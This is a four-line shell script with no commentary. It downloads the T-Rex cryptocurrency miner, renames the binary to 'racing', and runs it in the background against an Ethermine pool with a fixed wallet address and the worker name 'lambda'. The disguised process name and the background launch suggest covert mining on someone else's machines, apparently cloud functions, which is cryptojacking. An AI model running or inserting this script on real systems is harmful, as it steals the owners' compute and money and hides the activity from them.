wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0xC46a50Bf45261e21B7418EeAf80e51f331a7Afb8 -p x -w lambda &
